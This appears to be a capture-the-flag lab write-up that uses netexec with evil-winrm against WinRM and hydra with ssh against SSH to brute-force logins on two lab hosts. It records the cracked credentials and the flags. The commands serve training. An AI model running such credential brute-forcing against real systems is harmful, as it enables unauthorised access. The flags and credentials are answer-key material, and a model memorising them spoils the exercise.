# Here we will try to answer these 2 questions :
#### _Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer._
#### _Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer._
## Question one:
### The Goal
The objective is to find the password for the WinRM service on the target machine (`10.129.202.136`), log in, and find the flag.

---

### The Steps

1.  **Prepare for the Attack:**
    *   The user first downloaded the `network-services.zip` file provided by the challenge.
    *   This file was unzipped to get the necessary wordlists: `usernames.list` and `passwords.list`.

2.  **Launch the Brute-Force Attack:**
    *   The user ran `netexec` to test all usernames against all passwords for the WinRM service.
    *   **Command:**
        ```sh
        netexec winrm 10.129.202.136 -u usernames.list -p passwords.list
        ```
![Screenshot](<Images/Screenshot 2025-11-13 101734.png>)
3.  **Identify the Cracked Credentials:**
    *   The `netexec` output showed many failed attempts but found one successful combination, indicated by `(Pwn3d!)`.
    *   **Cracked Credentials:** `john:november`

4.  **Connect to the Target:**
    *   The user then used `evil-winrm` to connect to the target machine with the credentials they just found.
    *   **Command:**
        ```sh
        evil-winrm -i 10.129.202.136 -u john -p november
        ```
![Screenshot](<Images/Screenshot 2025-11-13 103037.png>)
5.  **Find and Read the Flag:**
    *   After successfully logging in, the user navigated to the Desktop (`cd Desktop`).
    *   They listed the files (`ls`) and found `flag.txt`.
    *   Finally, they read the file's contents to get the flag.
    *   **Command:**
        ```sh
        cat flag.txt
        ```
    *   **Flag:** `HTB{That5Novembr3r}`

![Screenshot](<Images/Screenshot 2025-11-13 104253.png>)

# ***********************************************
## Question two:
### The Goal
The objective is to find the password for the SSH service on the target machine (`10.129.210.41`), log in, and find the flag.

---

### The Steps

1.  **Launch Brute-Force Attack:**
    *   The user ran `hydra` to test a list of usernames (`usernames.list`) and passwords (`passwords.list`) against the SSH service.
    *   **Command:**
        ```sh
        hydra -L usernames.list -P passwords.list ssh://10.129.210.41
        ```

2.  **Identify Cracked Credentials:**
    *   `hydra` successfully found a valid login combination.
    *   **Cracked Credentials:** `dennis:rockstar`

3.  **Connect to the Target:**
    *   The user then connected to the target machine using the cracked credentials.
    *   *(The `ssh dennis@10.129.210.41` Opens the shell).*

4.  **Find and Read the Flag:**
    *   After logging in, the user navigated to the Desktop and read the `flag.txt` file.
    *   **Command:**
        ```sh
        type flag.txt
        ```
    *   **Flag:** `HTB{Let5GoH4ck!}`
    *   ![Screenshot](<Images/Screenshot 2025-11-13 142338.png>)
